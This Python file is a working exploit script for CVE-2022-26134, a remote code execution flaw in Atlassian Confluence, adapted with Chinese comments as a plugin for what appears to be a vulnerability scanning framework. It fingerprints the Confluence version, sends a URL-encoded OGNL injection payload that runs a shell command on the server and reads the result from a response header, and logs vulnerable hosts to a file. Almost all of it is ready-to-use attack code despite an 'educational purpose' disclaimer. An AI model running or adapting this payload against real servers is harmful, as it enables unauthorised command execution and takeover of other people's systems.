# -*- coding: utf-8 -*-

# Author:   Naqwada (RuptureFarm 1029) <naqwada@pm.me>
# License:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Docs:     https://github.com/Naqwa/CVE-2022-26134
# Website:  http://samy.link/
# Linkedin: https://www.linkedin.com/in/samy-younsi/
# Note:     FOR EDUCATIONAL PURPOSE ONLY.

from bs4 import BeautifulSoup
import requests
import urllib3
import re
import sys

urllib3.disable_warnings()

# filename漏洞编号，这个将变成命令参数使用最好不要用中文
# main这个就是接口函数
# name 这个是这个漏洞代码的说明
# important就是必要要用的参数
# 其他的都会当做参数来用
he_lp={
    'filename':'CVE-2022-26134',
    'main':'main',
    'name':'CVE-2022-26134Confluence远程命令执行漏洞',
    'important':['u'],
    'u':'目标',
}


# 提取出来的结果保存起来
def Searchresults(results_IP):
    Searchresults_document = open("poc.txt", 'a')  # 打开文件写的方式
    Searchresults_document.write((results_IP+'\n'))  # 写入
    Searchresults_document.close()  # 关闭文件

def banner():
    CVE_2022_26134Logo = """
   _______    ________                                
  / ____/ |  / / ____/                                
 / /    | | / / __/                                   
/ /___  | |/ / /___                                   
\____/  |___/_____/___       ___   _____________ __ __
  |__ \ / __ \__ \|__ \     |__ \ / ___<  /__  // // /
  __/ // / / /_/ /__/ /_______/ // __ \/ / /_ </ // /_
 / __// /_/ / __// __/_____/ __// /_/ / /___/ /__  __/
/____/\____/____/____/    /____/\____/_//____/  /_/   

                  \033[1;91mCVE-2022-26134 - OGNL injection vulnerability\033[1;m                  
Author: \033[1;92mNaqwada\033[1;m                         
RuptureFarm 1029      
                FOR EDUCATIONAL PURPOSE ONLY.   
  """
    return print('\033[1;94m{}\033[1;m'.format(CVE_2022_26134Logo))


def check_target_version(host):
    try:
        response = requests.get("{}/login.action".format(host), verify=False, timeout=8)
        if response.status_code == 200:
            filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)

            if len(filter_version) >= 1:
                version = filter_version[0].split("'>")[1].split('</')[0]
                return version
            else:
                return False
        else:
            return host
    except:
        return False


def send_payload(host, command):
    payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(
        command)
    try:
        response = requests.get("{}/{}/".format(host, payload), verify=False, allow_redirects=False, timeout=8)
    except:
        print("请求超时!")
    try:
        if response.status_code == 302:
            a=response.headers["X-Cmd-Response"]
            print("这个存在漏洞：" + host)
            Searchresults(host)
            return response.headers["X-Cmd-Response"]
        else:
            return "这个目标似乎并不脆弱：" + host
    except:
        return "这个目标似乎并不脆弱：" + host


def main(target):
    banner()
    # if len(sys.argv) < 3:
    #   print("\033[1;94mHow to use:\033[1;m")
    #   print("python3 {} https://target.com cmd".format(sys.argv[0]))
    #   print("ex: python3 {} https://target.com id".format(sys.argv[0]))
    #   print("ex: python3 {} https://target.com 'ps aux'".format(sys.argv[0]))
    #   return
    cmd = "id"
    version = check_target_version(target)

    if version:
        print("Confluence 目标版本： \033[1;94m{}\033[1;m".format(version))
    else:
        print("找不到此目标的使用版本。 目标是否离线？")
        return

    exec_payload = send_payload(target, cmd)
    print(exec_payload)


# if __name__ == "__main__":
#     main()